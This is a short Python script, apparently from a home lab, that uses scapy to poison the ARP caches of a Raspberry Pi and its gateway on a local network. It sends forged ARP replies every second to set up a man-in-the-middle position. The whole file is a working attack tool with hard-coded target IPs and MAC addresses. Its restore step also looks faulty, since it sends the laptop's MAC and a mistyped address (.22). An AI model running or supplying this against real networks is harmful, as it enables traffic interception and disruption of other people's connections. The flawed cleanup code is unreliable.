import scapy.all as scapy
import time
import argparse
import sys

#spoofer function that works with scapy.send to create 'spoof' ARP packets to send to the victim
def spoofer(targetIP, spoofIP):
    #targetIP - RPi IP, hwdst - RPi MAC Address, spoofIP - GatewayIP
    packet=scapy.ARP(op=2,pdst=targetIP,hwdst='b8:27:eb:ee:a1:9f',psrc=spoofIP)
    scapy.send(packet, verbose=False)

#restore function that works on keyboardInterrupt to allow stopping of sending of packets, by sending a scapy.send(packet with count = 4) (essentially an end request)
def restore(destinationIP, sourceIP):
    #destinationIP - RPi IP, sourceIP - my laptop's IP, hwsrc - laptop MAC address
    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst='b8:27:eb:ee:a1:9f', psrc=sourceIP,hwsrc='f0:79:60:2a:eb:a6')
    scapy.send(packet, count=4,verbose=False)


packets = 0
try:
    while True:
        #.227 - RPi address, 1.1 - gateway address
        spoofer('192.168.1.227','192.168.1.1')
        spoofer('192.168.1.1','192.168.1.227')
        print("Sending packet number: " + str(packets)),
        packets +=1
        #sending a packet every 1 second
        time.sleep(1)

except KeyboardInterrupt:
    print("Sent " + str(packets) + " packets. Stopping now!")
    restore('192.168.1.227','192.168.1.1')
    restore('192.168.1.1','192.168.1.22')